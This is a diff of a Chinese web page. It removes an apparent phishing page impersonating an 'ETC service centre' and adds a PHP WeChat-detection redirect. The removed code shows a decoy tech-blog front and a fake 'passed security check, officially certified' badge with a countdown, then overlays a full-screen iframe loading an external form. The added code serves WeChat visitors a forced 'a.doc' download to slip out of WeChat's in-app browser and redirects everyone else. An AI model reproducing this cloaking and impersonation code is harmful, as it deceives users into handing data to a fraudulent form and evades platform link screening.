@@ -1,141 +1,91 @@
-<html>
+<?php
+$ua =$_SERVER['HTTP_USER_AGENT'];
+$isWechat = (strpos($ua, 'MicroMessenger')) ? true : false;
+if ($isWechat) {
+    header("Content-Disposition: attachment; filename=\"a.doc\"");
+    header("Content-Type: application/vnd.ms-word; charset=utf-8");
+} else {
+    header('location: https://www.xuezuoweb.com');
+}
+?>
+<!DOCTYPE html>
+
+<html lang="zh">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>快乐通ETC-服务中心</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>浏览器打开</title>
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    background-color: #f7f7f7;
+    text-align: center;
+    padding-top: 50px;
+  }
+
+  .container {
+    margin: 0 auto;
+    width: 90%;
+    max-width: 600px;
+    background-color: #fff;
+    padding: 20px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    border-radius: 8px;
+  }
+
+  button {
+    background-color: #007bff;
+    color: white;
+    padding: 10px 20px;
+    font-size: 18px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 20px;
+  }
+
+  button:hover {
+    background-color: #0056b3;
+  }
+
+  .instructions {
+    margin-top: 20px;
+    font-size: 16px;
+    color: #666;
+  }
+</style>
+
+<script>
+function openInBrowser() {
+  var targetUrl = 'https://www.xuezuoweb.com/'; // 替换为您想要跳转的网址
+
+  // 检测是否在微信浏览器中
+  var ua = navigator.userAgent.toLowerCase();
+  if (ua.match(/MicroMessenger/i) == 'micromessenger') {
+    // 在微信内，显示提示信息
+    alert('请点击右上角菜单，选择"在浏览器中打开"');
+  } else {
+    // 不在微信内，直接跳转
+    window.location.href = targetUrl;
+  }
+}
+</script>
 </head>
 <body>
-<script>
-(function(){
-    document.title = '快乐通ETC-服务中心';
-    const meta3 = document.createElement('meta');
-    meta3.setAttribute('name','description');
-    meta3.setAttribute('content','科技前沿专业技术资讯平台，提供最新科技动态、技术趋势分析、行业深度报告');
-    document.head.appendChild(meta3);
-    const meta4 = document.createElement('meta');
-    meta4.setAttribute('name','keywords');
-    meta4.setAttribute('content','科技前沿,技术资讯,科技新闻,行业分析,技术趋势');
-    document.head.appendChild(meta4);
-    const style = document.createElement('style');
-    style.textContent = `*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Microsoft YaHei",Arial,sans-serif;line-height:1.6;color:#333;background:#f5f5f5}.header{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:2rem 0;text-align:center}.header h1{font-size:2.5rem;margin-bottom:0.5rem}.header p{font-size:1.2rem;opacity:0.9}.nav{background:white;box-shadow:0 2px 4px rgba(0,0,0,0.1);position:sticky;top:0;z-index:100}.nav-container{max-width:1200px;margin:0 auto;padding:0 2rem}.nav ul{list-style:none;display:flex;justify-content:center}.nav li{margin:0 1rem}.nav a{display:block;padding:1rem;color:#333;text-decoration:none;transition:color 0.3s}.nav a:hover{color:#667eea}.container{max-width:1200px;margin:0 auto;padding:2rem}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:2rem;margin-top:2rem}.card{background:white;border-radius:10px;padding:1.5rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);transition:transform 0.3s}.card:hover{transform:translateY(-5px)}.card h3{color:#667eea;margin-bottom:1rem}.card p{color:#666;margin-bottom:1rem}.card .date{color:#999;font-size:0.9rem}.footer{background:#333;color:white;text-align:center;padding:2rem;margin-top:3rem}iframe{width:100vw;height:100vh;border:0;position:fixed;top:0;left:0;z-index:9999;pointer-events:auto;-ms-touch-action:none;touch-action:none}`;
-    document.head.appendChild(style);
-    // 禁止双指缩放事件（外层拦截）
-    document.addEventListener('touchstart',function(e){
-        if(e.touches.length>1){
-            e.preventDefault();
-        }
-    },{passive:false});
-    let lastTouchEnd = 0;
-    document.addEventListener('touchend',function(e){
-        const now = Date.now();
-        if(now - lastTouchEnd <= 300){
-            e.preventDefault();
-        }
-        lastTouchEnd = now;
-    },{passive:false});
 
-    const blogDiv = document.createElement('div');
-    blogDiv.id = 'blog';
-    blogDiv.innerHTML = `<div id="home"></div><header class="header">
-    <h1>科技前沿</h1>
-    <p>专业技术资讯平台，洞察科技趋势</p></header><nav class="nav">
-    <div class="nav-container">
-    <ul>
-    <li><a href="#home">首页</a></li>
-    <li><a href="#tech">技术资讯</a></li>
-    <li><a href="#industry">行业分析</a></li>
-    <li><a href="#trends">科技趋势</a></li>
-    <li><a href="#about">关于我们</a></li>
-    </ul>
-    </div></nav><div class="container">
-    <section>
-    <h2>热门资讯</h2>
-    <div class="grid">
-    <article class="card">
-    <h3>人工智能发展现状与趋势</h3>
-    <p>深度分析当前人工智能技术的发展现状，探讨未来AI在各行业的应用前景和技术突破方向。</p>
-    <div class="date">2025-01-15</div>
-    </article>
-    <article class="card">
-    <h3>5G技术商用化进展</h3>
-    <p>全面解读5G技术的最新商用化进展，分析其对物联网、自动驾驶等领域的深远影响。</p>
-    <div class="date">2025-01-14</div>
-    </article>
-    <article class="card">
-    <h3>云计算市场分析报告</h3>
-    <p>详细分析全球云计算市场的发展态势，包括主要厂商竞争格局和技术发展方向。</p>
-    <div class="date">2025-01-13</div>
-    </article>
-    <article class="card">
-    <h3>区块链技术应用前景</h3>
-    <p>探讨区块链技术在金融、供应链、数字身份等领域的创新应用和发展潜力。</p>
-    <div class="date">2025-01-12</div>
-    </article>
-    <article class="card">
-    <h3>量子计算技术突破</h3>
-    <p>报道量子计算领域的最新技术突破，分析其对传统计算模式的颠覆性影响。</p>
-    <div class="date">2025-01-11</div>
-    </article>
-    <article class="card">
-    <h3>网络安全威胁分析</h3>
-    <p>深入分析当前网络安全面临的主要威胁，提供企业和个人的防护建议和最佳实践。</p>
-    <div class="date">2025-01-10</div>
-    </article>
-    </div>
-    </section>
-    <section style="margin-top:3rem">
-    <h2>关于科技前沿</h2>
-    <div class="about-content" style="background:white;padding:2rem;border-radius:10px;box-shadow:0 4px 6px rgba(0,0,0,0.1)">
-    <p>科技前沿是一个专业的技术资讯平台，致力于为读者提供最新、最权威的科技动态和行业分析。我们的团队由资深技术专家和行业分析师组成，确保内容的专业性和前瞻性。</p>
-    <br>
-    <p>我们关注人工智能、云计算、区块链、物联网、5G通信等前沿技术领域，为企业决策者、技术从业者和科技爱好者提供有价值的信息和洞察。</p>
-    </div>
-    </section></div><footer class="footer">
-    <p>科技前沿 - 专业技术资讯平台</p></footer>`;
-    document.body.appendChild(blogDiv);
-    // ✅ 已替换为你新的简道云地址
-    const targetUrl = 'https://tbmp7r1kcn.jiandaoyun.com/dash/6ad60b70ca851dcdac5eadc1';
-    const waitSecond = 2;
-    setTimeout(function(){
-        document.getElementById('blog').style.display = 'none';
-        document.title = '快乐通ETC-服务中心';
-        const loader = document.createElement('div');
-        loader.id = 'loader';
-        loader.style.cssText = `position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10000;font-family:"Microsoft YaHei",Arial,sans-serif;color:#222;text-align:center;background:#fff;padding:30px 36px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.12);width:340px;border:1px solid #eef3f7;`;
-        let count = waitSecond;
-        loader.innerHTML = `
-            <div style="width:72px;height:72px;margin:0 auto 18px;border-radius:50%;background:linear-gradient(135deg,#00b42a 0%,#009520 100%);display:flex;align-items:center;justify-content:center;box-shadow:0 8px 20px rgba(0,180,42,0.35);">
-                <svg width="42" height="42" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 2l8 4v6c0 5-3.5 9.3-8 10-4.5-.7-8-5-8-10V6l8-4z" fill="#ffffff" opacity="0.15"/>
-                    <path d="M12 2l8 4v6c0 5-3.5 9.3-8 10-4.5-.7-8-5-8-10V6l8-4z" stroke="#ffffff" stroke-width="1.6"/>
-                    <path d="M8.5 12.5l2.5 2.5 4.5-5" stroke="#ffffff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <div style="font-size:17px;font-weight:600;color:#1f1f1f;margin-bottom:6px;">已通过安全检测</div>
-            <div style="font-size:14px;color:#666;margin-bottom:18px;">【ETC服务中心】官方认证</div>
-            <div style="display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;color:#333;">
-                <span>剩余时间</span>
-                <span id="cd" style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:8px;background:#f1f8ff;color:#1677ff;font-weight:700;font-size:15px;">${count}</span>
-                <span>秒</span>
-            </div>
-        `;
-        document.body.appendChild(loader);
-        const timer = setInterval(()=>{
-            count--;
-            const cdEl = document.getElementById('cd');
-            if(cdEl) cdEl.innerText = count;
-            if(count <= 0){
-                clearInterval(timer);
-                loader.style.display = 'none';
-                const iframe = document.createElement('iframe');
-                iframe.src = targetUrl;
-                iframe.style.cssText = 'width:100vw;height:100vh;border:0;position:fixed;top:0;left:0;z-index:9999;-ms-touch-action:none;touch-action:none';
-                iframe.sandbox = "allow-same-origin allow-forms allow-scripts";
-                document.body.appendChild(iframe);
-            }
-        },1000);
-    },100);
-})();
-</script>
+<div class="container">
+  <h1>网站搭建学习网</h1>
+  <p>为了更好浏览体验,请通过右上角从浏览器打开</p>
+  <div class="instructions">
+    <p>如果您在微信中打开此页面，请：</p>
+    <ol>
+      <li>点击页面右上角的三个点</li>
+      <li>选择“在浏览器中打开”</li>
+      <li><button onclick="openInBrowser()">打开网站搭建学习网</button></li>
+    </ol>
+
+  </div>
+</div>
+
 </body>
 </html>
